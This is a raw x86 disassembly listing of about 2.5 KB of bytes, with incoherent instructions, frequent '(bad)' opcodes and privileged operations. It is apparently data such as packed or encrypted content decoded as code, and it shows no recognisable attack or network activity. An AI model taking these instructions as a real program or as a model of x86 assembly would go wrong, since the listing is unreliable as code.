  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	stc    
  425001:	mov    al,0x7
  425003:	mov    dl,0x6a
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x38000001,al
  42500d:	cli    
  42500e:	pusha  
  42500f:	iret   
  425010:	mov    bl,0xbc
  425012:	xlat   BYTE PTR ds:[ebx]
  425013:	dec    esi
  425014:	mov    ecx,0x401d7633
  425019:	xchg   esi,eax
  42501a:	adc    eax,0xb4c64c1b
  42501f:	pop    ss
  425020:	rcr    ecx,0xc1
  425023:	sub    DWORD PTR [ebp+esi*2-0x23c91a99],0x68
  42502b:	add    ecx,DWORD PTR [edx]
  42502d:	scas   al,BYTE PTR es:[edi]
  42502e:	mov    esp,0x7fe5ccc0
  425033:	cli    
  425034:	sar    BYTE PTR [ebx-0x162e374d],1
  42503a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42503b:	test   al,0x6b
  42503d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42503e:	ds jp  0x42508a
  425041:	ins    BYTE PTR es:[edi],dx
  425042:	sbb    al,BYTE PTR [edx]
  425044:	into   
  425045:	cmp    al,0xd5
  425047:	jo     0x424fe1
  425049:	mov    ecx,DWORD PTR [ecx+0x69]
  42504c:	popa   
  42504d:	loope  0x425047
  42504f:	fcmovb st,st(2)
  425051:	inc    ebx
  425052:	loopne 0x425076
  425054:	and    ebp,ebp
  425056:	cmp    al,0xcd
  425058:	add    al,0x49
  42505a:	inc    edx
  42505b:	cld    
  42505c:	cli    
  42505d:	mov    edi,0xf7a0b509
  425062:	pusha  
  425063:	mov    al,0x97
  425065:	xor    ebx,DWORD PTR [eax+eax*8]
  425068:	fdivr  DWORD PTR [esi]
  42506a:	push   esi
  42506b:	cld    
  42506c:	(bad)  
  42506d:	push   0x2570e231
  425072:	push   ecx
  425073:	mov    BYTE PTR [eax-0xa],ah
  425076:	aam    0xfc
  425078:	outs   dx,BYTE PTR ds:[esi]
  425079:	sahf   
  42507a:	inc    ecx
  42507b:	sbb    al,dl
  42507d:	xchg   esp,eax
  42507e:	das    
  42507f:	sub    ecx,ecx
  425081:	mov    edx,0x9423efeb
  425086:	mov    ebx,0xbec9e4da
  42508b:	jl     0x42507c
  42508d:	and    bl,ch
  42508f:	cmc    
  425090:	call   0x3eee2588
  425095:	or     al,0xc9
  425097:	in     eax,0xbb
  425099:	dec    ebp
  42509a:	xchg   edx,eax
  42509b:	dec    BYTE PTR [edi]
  42509d:	jl     0x4250d9
  42509f:	xchg   BYTE PTR [esi+0x24fac290],cl
  4250a5:	mov    dh,BYTE PTR [esi+0x6b4644ce]
  4250ab:	sahf   
  4250ac:	mov    cl,0xc
  4250ae:	and    BYTE PTR [ecx],dl
  4250b0:	xchg   BYTE PTR [esi+eax*1],ah
  4250b3:	sub    al,0x9b
  4250b5:	jge    0x4250aa
  4250b7:	das    
  4250b8:	or     edx,esp
  4250ba:	fstp   TBYTE PTR [eax]
  4250bc:	or     DWORD PTR [edi],ecx
  4250be:	jge    0x4250a2
  4250c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250c1:	xchg   esp,eax
  4250c2:	inc    eax
  4250c3:	jnp    0x425107
  4250c5:	loope  0x425057
  4250c7:	addr16 mov al,ds:0xd560
  4250cb:	push   esi
  4250cc:	mov    ah,0xcc
  4250ce:	jnp    0x425064
  4250d0:	cli    
  4250d1:	hlt    
  4250d2:	pop    edi
  4250d3:	ins    BYTE PTR es:[edi],dx
  4250d4:	cmp    DWORD PTR es:[ebp-0x4b],ebp
  4250d8:	push   ecx
  4250d9:	jp     0x425124
  4250db:	pop    esp
  4250dc:	fdiv   st,st(5)
  4250de:	inc    esi
  4250df:	repnz cmp bh,bl
  4250e2:	add    eax,0x789c1692
  4250e7:	retf   
  4250e8:	inc    edi
  4250e9:	mov    dh,0xa2
  4250eb:	in     al,0x9a
  4250ed:	adc    ebp,DWORD PTR [esi+0x5f]
  4250f0:	out    dx,eax
  4250f1:	push   cs
  4250f2:	or     eax,0xc677d5bf
  4250f7:	jb     0x42507d
  4250f9:	stos   BYTE PTR es:[edi],al
  4250fa:	cli    
  4250fb:	and    al,0x8
  4250fd:	pop    esp
  4250fe:	rol    BYTE PTR [edx+0x12],0xab
  425102:	mov    esp,0xf6ea7ba6
  425107:	outs   dx,DWORD PTR ds:[esi]
  425108:	imul   ebx,esi,0xd2f5d590
  42510e:	in     al,0xa2
  425110:	pop    DWORD PTR [eax]
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x5aba:0x782392e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xf4000001,al
  42518d:	popf   
  42518e:	rcl    DWORD PTR ds:0x4b7fd343,0x9
  425195:	call   0x2826802d
  42519a:	lock xor ch,cl
  42519d:	(bad)  
  42519e:	inc    esi
  42519f:	cmc    
  4251a0:	adc    al,0xff
  4251a2:	push   esp
  4251a3:	xchg   edx,ebp
  4251a5:	mov    ecx,0xe96eb32b
  4251aa:	test   BYTE PTR [esi+0x7c4a2d3f],0xd4
  4251b1:	adc    DWORD PTR [edx+0x3f],esi
  4251b4:	es jg  0x425191
  4251b7:	dec    ebp
  4251b8:	dec    esi
  4251b9:	or     DWORD PTR [esi+ebp*2+0x3a020ca7],esp
  4251c0:	xor    DWORD PTR [ebp-0x328e7259],esi
  4251c6:	or     esi,esi
  4251c8:	add    dl,ah
  4251ca:	push   ecx
  4251cb:	pop    eax
  4251cc:	enter  0x5173,0xd
  4251d0:	pop    ebx
  4251d1:	add    DWORD PTR [ecx-0x7e57aaa0],esp
  4251d7:	call   0x8a34:0x339ffa5c
  4251de:	arpl   sp,si
  4251e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251e1:	aam    0x10
  4251e3:	xchg   esp,eax
  4251e4:	ror    ebp,1
  4251e6:	iret   
  4251e7:	call   0x3c0a3771
  4251ec:	fcomp  DWORD PTR [edi]
  4251ee:	jne    0x4251a2
  4251f0:	jecxz  0x425211
  4251f2:	jg     0x42517d
  4251f4:	or     al,0xd7
  4251f6:	xchg   ebp,eax
  4251f7:	xchg   dh,bh
  4251f9:	adc    ebp,DWORD PTR [edx]
  4251fb:	les    edi,FWORD PTR [eax+eax*1-0x45]
  4251ff:	pusha  
  425200:	fldl2t 
  425202:	jmp    0x1b75:0xf534c256
  425209:	adc    cl,ch
  42520b:	sub    BYTE PTR [ebp+0x19],cl
  42520e:	loop   0x4251c1
  425210:	lar    edx,WORD PTR [ecx-0x6f3c86bc]
  425217:	xor    edi,edi
  425219:	rol    DWORD PTR [ebp+0x52],cl
  42521c:	mov    ecx,0x6d9c0082
  425221:	dec    ebx
  425222:	enter  0x419d,0xe1
  425226:	inc    ebx
  425227:	xor    esp,DWORD PTR [ebx+0x34]
  42522a:	sub    esp,DWORD PTR [edi]
  42522c:	arpl   WORD PTR [edi-0x25],dx
  42522f:	push   eax
  425230:	gs jp  0x425216
  425233:	enter  0x13ab,0xd9
  425237:	mov    DWORD PTR [ecx-0x191a4b3d],ebx
  42523d:	leave  
  42523e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42523f:	scas   eax,DWORD PTR es:[edi]
  425240:	sbb    dh,BYTE PTR [esi]
  425242:	push   ebp
  425243:	mov    dl,0x13
  425245:	adc    cl,BYTE PTR [ebp-0x44cd2e15]
  42524b:	(bad)  
  42524c:	cmp    BYTE PTR [eax-0x4253b817],bh
  425252:	mov    esi,0x47d7bd28
  425257:	push   cs
  425258:	in     eax,dx
  425259:	leave  
  42525a:	les    edi,FWORD PTR [edx]
  42525c:	addr16 mov ch,0xa
  42525f:	sub    BYTE PTR [ebx],dh
  425261:	idiv   dh
  425263:	ds and eax,0x13e17220
  425269:	cmp    eax,0xc7794e75
  42526e:	cwde   
  42526f:	mov    dl,0xe6
  425271:	push   eax
  425272:	push   es
  425273:	and    edi,0x4b6fc22
  425279:	adc    al,0x1f
  42527b:	or     al,0x1a
  42527d:	jne    0x425203
  42527f:	pushf  
  425280:	push   ebp
  425281:	push   cs
  425282:	(bad)  
  425283:	xchg   edx,eax
  425284:	stos   BYTE PTR es:[edi],al
  425285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425286:	xchg   esp,eax
  425287:	(bad)  
  425288:	in     al,dx
  425289:	push   cs
  42528a:	neg    DWORD PTR [esi+0x61]
  42528d:	popa   
  42528e:	jo     0x425289
  425290:	mov    cl,0x0
	...
  4252f2:	add    BYTE PTR [eax],al
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	dec    edi
  425301:	retf   0x8afc
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0xe7000001
  42530d:	jle    0x42533b
  42530f:	and    eax,0x8993fa37
  425314:	mov    esi,0x2f9e0b34
  425319:	xchg   edi,eax
  42531a:	cmp    eax,0x5b0e58d4
  42531f:	adc    edi,DWORD PTR [eax]
  425321:	push   edi
  425322:	aaa    
  425323:	clc    
  425324:	ins    DWORD PTR es:[edi],dx
  425325:	inc    esi
  425326:	add    cl,ch
  425328:	jno    0x4252d2
  42532a:	mov    bl,0xb6
  42532c:	xor    DWORD PTR [ebx-0x13923d98],ecx
  425332:	xchg   DWORD PTR [ebp+0x2d],edx
  425335:	clc    
  425336:	mov    al,0x4e
  425338:	ins    BYTE PTR es:[edi],dx
  425339:	mov    bl,0xbd
  42533b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42533c:	lock pop es
  42533e:	retf   
  42533f:	push   ebx
  425340:	outs   dx,DWORD PTR ds:[esi]
  425341:	daa    
  425342:	mov    eax,ds:0xa0c17376
  425347:	int3   
  425348:	sbb    DWORD PTR [edi+0x3c],eax
  42534b:	stos   BYTE PTR es:[edi],al
  42534c:	gs pop esi
  42534e:	icebp  
  42534f:	xor    BYTE PTR ds:0xfacf4698,ch
  425355:	sti    
  425356:	call   FWORD PTR [ebp+0x5ded62b6]
  42535c:	cli    
  42535d:	xchg   edx,eax
  42535e:	mov    edx,0x365889f3
  425363:	dec    esp
  425364:	mov    al,ds:0x3673392a
  425369:	pop    ecx
  42536a:	push   eax
  42536b:	call   0xf08:0x92139eee
  425372:	push   esi
  425373:	popf   
  425374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425375:	cli    
  425376:	(bad)  
  425377:	idiv   esp
  425379:	inc    edx
  42537a:	pop    ds
  42537b:	shl    DWORD PTR ds:0x61004e87,cl
  425381:	adc    al,0xfb
  425383:	outs   dx,DWORD PTR ds:[esi]
  425384:	gs jmp 0x5eb6:0xa60fc31c
  42538c:	es stos BYTE PTR es:[edi],al
  42538e:	dec    esp
  42538f:	sub    ch,cl
  425391:	or     BYTE PTR gs:[edx],bl
  425394:	push   0x25b81042
  425399:	mov    DWORD PTR [ebp+0x43eb62b4],ecx
  42539f:	or     al,0xcf
  4253a1:	push   eax
  4253a2:	add    ah,al
  4253a4:	push   0x1cf416c1
  4253a9:	scas   eax,DWORD PTR es:[edi]
  4253aa:	shl    BYTE PTR [ebp+ecx*8-0x7846943f],0x10
  4253b2:	jo     0x4253e4
  4253b4:	or     BYTE PTR [ebp-0x4bbd7686],dh
  4253ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253bb:	out    0x98,eax
  4253bd:	mov    ds:0x1fc313d0,al
  4253c2:	sbb    edi,DWORD PTR [ecx]
  4253c4:	(bad)  
  4253c6:	pop    ebp
  4253c7:	or     eax,0xd8f88338
  4253cc:	rcl    ebx,cl
  4253ce:	nop
  4253cf:	jno    0x425417
  4253d1:	mov    ds:0x2aaea29e,eax
  4253d6:	not    dh
  4253d8:	push   ebp
  4253d9:	scas   al,BYTE PTR es:[edi]
  4253da:	push   es
  4253db:	pop    ebx
  4253dc:	lock scas al,BYTE PTR es:[edi]
  4253de:	enter  0x7ff3,0xae
  4253e2:	jl     0x425383
  4253e4:	push   ss
  4253e5:	inc    ebx
  4253e6:	gs or  BYTE PTR ss:[ebx],dh
  4253ea:	not    DWORD PTR [ebp+0x91423c7]
  4253f0:	jns    0x425458
  4253f2:	sub    BYTE PTR [esi],dl
  4253f4:	adc    BYTE PTR [esi+0x6ba92270],bl
  4253fa:	pushf  
  4253fb:	sub    edx,DWORD PTR [edi+edi*1+0x3b81cc7b]
  425402:	aad    0xb7
  425404:	adc    DWORD PTR [edx+0x37],edx
  425407:	sub    edx,DWORD PTR [edx-0x67]
  42540a:	scas   al,BYTE PTR es:[edi]
  42540b:	cwde   
  42540c:	sbb    al,BYTE PTR [ebx+0x76]
  42540f:	mov    ch,0xb8
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    eax,DWORD PTR [ebp+0x7932abc9]
  425485:	mov    es,WORD PTR [ecx]
  425487:	add    BYTE PTR ds:0xfc000001,al
  42548d:	std    
  42548e:	repnz jecxz 0x425501
  425491:	lds    edi,FWORD PTR [eax-0x746370ee]
  425497:	das    
  425498:	mov    dl,0x45
  42549a:	jge    0x4254ab
  42549c:	scas   al,BYTE PTR es:[edi]
  42549d:	daa    
  42549e:	mov    dl,BYTE PTR [ebx-0x6183956a]
  4254a4:	jne    0x42542d
  4254a6:	xchg   edx,eax
  4254a7:	push   ebx
  4254a8:	add    eax,0xa0958342
  4254ad:	aas    
  4254ae:	out    dx,al
  4254af:	repz jmp 0xe1ee:0xa8f4d72c
  4254b7:	add    dh,BYTE PTR [ecx+0x79]
  4254ba:	dec    edx
  4254bb:	jbe    0xbe5644ab
  4254c1:	mov    al,BYTE PTR [edi+0x63]
  4254c4:	cdq    
  4254c5:	add    al,0x9d
  4254c7:	sbb    edx,ebx
  4254c9:	push   edx
  4254ca:	test   DWORD PTR [edx+ebx*1-0x4ae33128],0x934863e3
  4254d5:	jnp    0x42551b
  4254d7:	mov    dl,0x7b
  4254d9:	test   ah,bh
  4254db:	and    cl,BYTE PTR [eax+0x1c1f4fb9]
  4254e1:	iret   
  4254e2:	xchg   BYTE PTR [eiz*1-0x28d06c95],cl
  4254e9:	sbb    ecx,DWORD PTR [edi]
  4254eb:	mov    cl,0x4b
  4254ed:	xchg   ecx,eax
  4254ef:	jle    0x425564
  4254f1:	sub    esp,DWORD PTR [eax]
  4254f3:	aas    
  4254f4:	mov    ch,0x13
  4254f6:	xor    BYTE PTR [ebp+0x760ac16b],dl
  4254fc:	mov    ah,0x86
  4254fe:	mov    dl,0xb2
  425500:	xchg   esi,eax
  425501:	nop
  425502:	pop    ebx
  425503:	dec    ecx
  425504:	inc    edi
  425505:	fist   DWORD PTR [edx]
  425507:	mov    eax,0x518c1379
  42550c:	aaa    
  42550d:	mov    al,0xe5
  42550f:	data16 int 0xbc
  425512:	rcr    BYTE PTR [ecx],0x74
  425515:	mov    ds:0x30b01fb9,eax
  42551a:	in     eax,0xc9
  42551c:	mov    WORD PTR [eax+0x2b],ss
  42551f:	dec    edx
  425520:	inc    ecx
  425521:	jno    0x4254e4
  425523:	ret    
  425524:	fwait
  425525:	adc    BYTE PTR [edi+0x8f352f4],dl
  42552b:	xor    eax,0x84071bfe
  425530:	inc    eax
  425531:	gs out 0x45,eax
  425534:	dec    esi
  425535:	pop    edx
  425536:	mov    esi,0xe7a3bc73
  42553b:	sbb    al,0x28
  42553d:	imul   esp,DWORD PTR [ecx],0x7c
  425540:	in     al,0xe1
  425542:	(bad)  
  425543:	fdiv   QWORD PTR [ecx-0xa]
  425546:	mov    bh,0xec
  425548:	mov    ebp,?
  42554a:	(bad)
  42554d:	mov    esp,gs
  42554f:	cld    
  425550:	dec    ebx
  425551:	punpcklbw mm3,mm7
  425554:	sub    al,0xdc
  425556:	cmp    eax,0x78a920d5
  42555b:	andps  xmm0,XMMWORD PTR [ebp+0x38a71f48]
  425562:	cmp    ch,BYTE PTR [esi]
  425564:	stos   BYTE PTR es:[edi],al
  425565:	js     0x42550d
  425567:	aad    0x84
  425569:	inc    esp
  42556a:	add    BYTE PTR [eax],ah
  42556c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42556d:	dec    edx
  42556e:	in     al,0x3f
  425570:	test   DWORD PTR [esi+0x1a70598c],0x7a763c19
  42557a:	or     DWORD PTR [ecx],edi
  42557c:	cmp    BYTE PTR [eax-0x2aa80bae],al
  425582:	xor    BYTE PTR [ebx+0x70],ch
  425585:	shl    DWORD PTR [ebx+esi*2-0x50],cl
  425589:	add    eax,0x8aefe7cc
  42558e:	pop    es
  42558f:	mov    bh,0xf6
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x2319f13a
  425602:	and    eax,0x18f7e6c
  425607:	add    BYTE PTR ds:0xd2000001,al
  42560d:	nop
  42560e:	mov    edx,ebx
  425610:	xchg   ebp,eax
  425611:	into   
  425612:	out    dx,eax
  425613:	clc    
  425614:	std    
  425615:	adc    al,0xc3
  425617:	icebp  
  425618:	nop
  425619:	xchg   edx,eax
  42561a:	mov    dh,0x39
  42561c:	jne    0x4255cc
  42561e:	inc    eax
  42561f:	and    eax,ebx
  425621:	outs   dx,BYTE PTR ds:[esi]
  425622:	jecxz  0x425691
  425624:	xor    DWORD PTR [ecx],ebx
  425626:	xchg   ebx,eax
  425627:	push   es
  425628:	hlt    
  425629:	mov    ch,0x33
  42562b:	repz mov al,0x31
  42562e:	push   es
  42562f:	inc    ebp
  425630:	je     0x425619
  425632:	mov    eax,ds:0xc32d2d38
  425637:	jecxz  0x42561f
  425639:	inc    esp
  42563a:	retf   
  42563b:	jo     0x42569a
  42563d:	add    eax,DWORD PTR [ebp-0x18daa995]
  425643:	jge    0x42562e
  425645:	xchg   edi,eax
  425646:	les    ebp,FWORD PTR ds:0x119747b6
  42564c:	aam    0x15
  42564e:	mov    cl,0xbc
  425650:	sub    BYTE PTR [ecx+edx*2-0x73d7ee80],dl
  425657:	stos   DWORD PTR es:[edi],eax
  425658:	mov    DWORD PTR [eax+0x14],esi
  42565b:	dec    eax
  42565c:	(bad)  
  42565d:	jp     0x4255e0
  42565f:	xchg   edi,eax
  425660:	int    0xcb
  425662:	inc    ecx
  425663:	inc    eax
  425664:	mov    al,al
  425666:	mov    dl,0xf0
  425668:	adc    BYTE PTR [esi+0x64],al
  42566b:	sbb    al,0x2c
  42566d:	inc    edi
  42566e:	push   esp
  42566f:	jecxz  0x425674
  425671:	popf   
  425672:	pop    ecx
  425673:	out    dx,al
  425674:	js     0x42562f
  425676:	lahf   
  425677:	xor    al,0x24
  425679:	sbb    BYTE PTR [ebx-0x52c623de],al
  42567f:	and    DWORD PTR [ebx+ebx*1],ebp
  425682:	add    eax,DWORD PTR [ebp+0x3c]
  425685:	in     eax,dx
  425686:	or     eax,0x1908927d
  42568b:	jecxz  0x425640
  42568d:	mov    edx,0x5f54f5a4
  425692:	out    0x1b,eax
  425694:	fmul   DWORD PTR [ebp+0x6b2ff073]
  42569a:	test   eax,0x8c976cc
  42569f:	fldcw  WORD PTR [edx-0x60df53d3]
  4256a5:	in     eax,dx
  4256a6:	dec    esi
  4256a7:	cli    
  4256a8:	loopne 0x425668
  4256aa:	jb     0x425689
  4256ac:	xchg   ecx,eax
  4256ad:	je     0x4256ec
  4256af:	pop    edx
  4256b0:	add    eax,0xeeea63d2
  4256b5:	int    0x89
  4256b7:	out    dx,al
  4256b8:	into   
  4256b9:	xor    al,0x29
  4256bb:	sbb    eax,0x1def166
  4256c0:	in     eax,dx
  4256c1:	mov    dl,0xad
  4256c3:	das    
  4256c4:	xchg   ebp,eax
  4256c5:	int3   
  4256c6:	push   eax
  4256c7:	adc    eax,0xda44d7f8
  4256cc:	lods   al,BYTE PTR ds:[esi]
  4256cd:	push   ds
  4256ce:	cmp    al,0x2a
  4256d0:	adc    eax,0x1851611b
  4256d5:	int    0x24
  4256d7:	mov    ch,0x92
  4256d9:	pop    eax
  4256da:	shl    DWORD PTR [edi+ebx*1+0x6c],0x3a
  4256df:	xor    DWORD PTR [esi-0x38117b00],edi
  4256e5:	aaa    
  4256e6:	daa    
  4256e7:	add    BYTE PTR [esi+0x51],bh
  4256ea:	stos   DWORD PTR es:[edi],eax
  4256eb:	fwait
  4256ec:	xchg   ecx,eax
  4256ed:	mov    ch,0xa5
  4256ef:	pop    esp
  4256f0:	push   edi
  4256f1:	hlt    
  4256f2:	jmp    0x27cc:0x8bf76ea2
  4256f9:	jmp    ebx
  4256fb:	pop    es
  4256fc:	repz lea eax,[ecx-0x1b]
  425700:	xchg   edi,eax
  425701:	sub    cl,dl
  425703:	fnstcw WORD PTR [ebp+0xf580e2d]
  425709:	pop    ss
  42570a:	cwde   
  42570b:	push   ebp
  42570c:	inc    ebx
  42570d:	xchg   esp,eax
  42570e:	clc    
  42570f:	xlat   BYTE PTR ds:[ebx]
  425710:	xchg   ecx,eax
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x63aba974
  425783:	add    DWORD PTR [ebx+0x5000190],eax
  425789:	add    DWORD PTR [eax],eax
  42578b:	add    cl,bh
  42578d:	aas    
  42578e:	call   0xae4:0x346f5699
  425795:	mov    ch,0x7c
  425797:	fnsave [ecx]
  425799:	dec    edi
  42579a:	shl    DWORD PTR [esi+0x52],0x34
  42579e:	addr16 mov ch,0x29
  4257a1:	adc    BYTE PTR [ebx-0x4c1a258d],cl
  4257a7:	mov    ebx,0x2353e00a
  4257ac:	sub    DWORD PTR [ecx-0x43],edx
  4257af:	pop    eax
  4257b0:	fild   DWORD PTR [ecx+0x47d22a2d]
  4257b6:	mov    esp,0x8d901ff6
  4257bb:	jne    0x42580f
  4257bd:	pusha  
  4257be:	sub    ecx,0x78
  4257c1:	or     al,0x96
  4257c3:	cmp    bl,dh
  4257c5:	inc    esp
  4257c6:	dec    eax
  4257c7:	cmc    
  4257c8:	stc    
  4257c9:	sbb    al,0xd8
  4257cb:	sahf   
  4257cc:	shl    BYTE PTR [edx],0x3a
  4257cf:	xchg   esp,eax
  4257d0:	xor    al,0x44
  4257d2:	and    dl,BYTE PTR [ecx-0x12f28054]
  4257d8:	cmp    ch,BYTE PTR [edx-0x4d6c66aa]
  4257de:	or     DWORD PTR [ebx+0x3693930b],edi
  4257e4:	ja     0x42580f
  4257e6:	outs   dx,DWORD PTR ds:[esi]
  4257e7:	jne    0x4257a4
  4257e9:	pusha  
  4257ea:	popf   
  4257eb:	hlt    
  4257ec:	outs   dx,DWORD PTR ds:[esi]
  4257ed:	loop   0x425840
  4257ef:	sub    al,0x83
  4257f1:	stos   DWORD PTR es:[edi],eax
  4257f2:	jp     0x42586a
  4257f4:	ret    0x2482
  4257f7:	and    BYTE PTR [edi],cl
  4257f9:	hlt    
  4257fa:	pop    ss
  4257fb:	inc    ebp
  4257fc:	(bad)  
  4257fe:	loopne 0x42585d
  425800:	cmp    ch,BYTE PTR [ebx-0x38f93b84]
  425806:	mov    ah,0x45
  425808:	ins    BYTE PTR es:[edi],dx
  425809:	fwait
  42580a:	push   esp
  42580b:	retf   0x402c
  42580e:	bound  esi,QWORD PTR [ecx-0x2866f9de]
  425814:	sub    eax,0x6d3105fb
  425819:	ficomp DWORD PTR [esi+0x44]
  42581c:	shl    edx,cl
  42581e:	sbb    BYTE PTR [eax+0x32],0xbe
  425822:	or     eax,0xd9364130
  425827:	into   
  425828:	pop    edi
  425829:	out    0xcd,eax
  42582b:	inc    ebx
  42582c:	sbb    esp,DWORD PTR [esi-0x1913ad1a]
  425832:	int    0x89
  425834:	or     ebp,DWORD PTR [ebp-0x35]
  425837:	lods   eax,DWORD PTR ds:[esi]
  425838:	sub    al,0x3d
  42583a:	pop    esi
  42583b:	fst    DWORD PTR [ebx]
  42583d:	aam    0x96
  42583f:	xchg   edx,eax
  425840:	xor    al,0x6d
  425842:	or     DWORD PTR [eax],esp
  425844:	sub    DWORD PTR [ebp-0x50bdaf85],ecx
  42584a:	iret   
  42584b:	out    0x2c,eax
  42584d:	jns    0x4258b5
  42584f:	inc    ecx
  425850:	sbb    ecx,DWORD PTR ds:0x739ecdcc
  425856:	pop    edx
  425857:	xchg   ebx,eax
  425858:	adc    bh,cl
  42585a:	test   BYTE PTR [eax],cl
  42585c:	mov    esi,0x3da7e138
  425861:	sub    edi,DWORD PTR [esi+0x35]
  425864:	xor    al,0xab
  425866:	and    ebp,0xffffffd7
  425869:	sub    eax,0x1b27a162
  42586e:	push   esp
  42586f:	fist   DWORD PTR [esi]
  425871:	push   edx
  425872:	(bad)
  425875:	inc    ebp
  425876:	mov    DWORD PTR [ecx-0x28dd1364],0x3e2fcade
  425880:	add    esi,esi
  425882:	push   eax
  425883:	jge    0x4258b4
  425885:	cmp    eax,0xb50e67c0
  42588a:	push   esi
  42588b:	jb     0x425840
  42588d:	popa   
  42588e:	mov    esi,0xfbe8
	...
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	loope  0x425970
  425902:	pop    edx
  425903:	push   esi
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	in     eax,dx
  42590d:	mov    ds:0x283efa1a,eax
  425912:	inc    edi
  425913:	out    dx,eax
  425914:	lods   eax,DWORD PTR ds:[esi]
  425915:	bound  ebx,QWORD PTR [edi-0x7f58dc56]
  42591b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42591c:	jmp    0x2fb483dc
  425921:	shr    DWORD PTR [edi],cl
  425923:	xchg   dh,dl
  425925:	xor    BYTE PTR [edx-0x42],ah
  425928:	pop    ss
  425929:	stc    
  42592a:	sti    
  42592b:	mov    ds:0xa335214a,eax
  425930:	das    
  425931:	push   esi
  425932:	add    al,0xa4
  425934:	sbb    eax,0x4f5a34ec
  425939:	fst    st(7)
  42593b:	cmc    
  42593c:	popa   
  42593d:	mov    dl,0x51
  42593f:	loop   0x425918
  425941:	xor    al,0x22
  425943:	rol    al,0xb2
  425946:	jecxz  0x42594f
  425948:	loopne 0x425940
  42594a:	cmp    edx,ebp
  42594c:	jg     0x42596f
  42594e:	sub    edx,eax
  425950:	retf   0xb10c
  425953:	cmp    eax,0x5f97b08d
  425958:	sbb    esi,DWORD PTR [esi-0x60]
  42595b:	dec    edx
  42595c:	add    al,BYTE PTR [ebx]
  42595e:	call   0xd41e:0x83426ba3
  425965:	mov    bh,0xc
  425967:	sbb    eax,0xb9e6f638
  42596c:	mov    es,WORD PTR [ebp-0x42]
  42596f:	mov    esi,0x9ff982f8
  425974:	loop   0x42594d
  425976:	mov    ah,0xcb
  425978:	mov    BYTE PTR [edi-0x3f71c8f],bl
  42597e:	and    ebp,DWORD PTR [ecx-0x52]
  425981:	and    al,0x78
  425983:	adc    DWORD PTR [eax],edx
  425985:	mov    esi,DWORD PTR [edx+eiz*1-0xe]
  425989:	stos   BYTE PTR es:[edi],al
  42598a:	sub    cl,BYTE PTR [edx-0x57c8d2e8]
  425990:	(bad)  
  425991:	xchg   ebp,eax
  425992:	scas   al,BYTE PTR es:[edi]
  425993:	sysenter 
  425995:	pusha  
  425996:	push   0x57
  425998:	jle    0x4259bd
  42599a:	mov    edx,0xc914a37c
  42599f:	test   al,cl
  4259a1:	add    eax,0x82f327bb
  4259a6:	or     edx,DWORD PTR [edi-0x68238029]
  4259ac:	cmc    
  4259ad:	jno    0x425936
  4259af:	imul   eax,edi,0x20
  4259b2:	inc    eax
  4259b3:	fidiv  WORD PTR [edi+0xc29e0fe]
  4259b9:	xor    al,0x20
  4259bb:	xchg   ecx,eax
  4259bc:	in     al,dx
  4259bd:	adc    eax,0x38e8131d
  4259c2:	xor    cl,al
  4259c4:	scas   al,BYTE PTR es:[edi]
  4259c5:	pop    esi
  4259c6:	xchg   ebp,eax
  4259c7:	out    dx,al
  4259c8:	push   edi
  4259c9:	mov    bh,0x12
  4259cb:	cdq    
  4259cc:	mov    bl,0xff
  4259ce:	jmp    0x11afb9cd
  4259d3:	jno    0x4259f4
  4259d5:	mov    esi,0x80b67bec
  4259da:	sbb    eax,0x53fee77
  4259df:	sub    edi,DWORD PTR [esi]
  4259e1:	push   cs
  4259e2:	cmp    bh,BYTE PTR [ebx]
  4259e4:	sub    bh,dl
  4259e6:	sbb    BYTE PTR [ebp-0x6c0bc6c5],0x20
  4259ed:	jg     0x425980
  4259ef:	shl    DWORD PTR [ebx],1
  4259f1:	call   0xd84d:0xebcf4989
  4259f8:	mov    ch,0x22
  4259fa:	adc    al,ah
  4259fc:	push   ebp
  4259fd:	int3   
  4259fe:	test   al,0x97
